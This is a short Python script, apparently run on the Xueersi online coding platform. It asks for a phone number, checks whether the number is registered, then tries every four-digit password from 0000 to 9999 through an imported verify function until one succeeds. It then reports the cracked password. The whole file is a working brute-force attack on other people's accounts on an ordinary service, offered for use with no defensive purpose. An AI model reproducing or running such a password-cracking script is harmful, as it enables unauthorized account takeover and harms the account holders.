#Run on https://code.xueersi.com/ide/code/46308984
from xes_crash import *
import easygui as g
import time

phone = g.enterbox("请输入手机号")
i = is_register(phone)
if i:
    g.msgbox("已注册，点击OK开始破解...")
    start_time = time.time()
    for i in range(10000):
        if i < 10:
            pwd = "000" + str(i)
        elif i < 100:
            pwd = "00" + str(i)
        elif i < 1000:
            pwd = "0" + str(i)
        else:
            pwd = str(i)
        # print(pwd)
        v = verify(phone, pwd)
        if v:
            end_time = time.time()
            run_time = end_time - start_time
            msg = "破解成功！\n\n手机号：" + str(phone) + "\n\n密码为：" + pwd + "\n\n共用时：" + str(run_time) + "秒"
            g.msgbox(msg)
            break
    
else:
    g.msgbox("未注册")
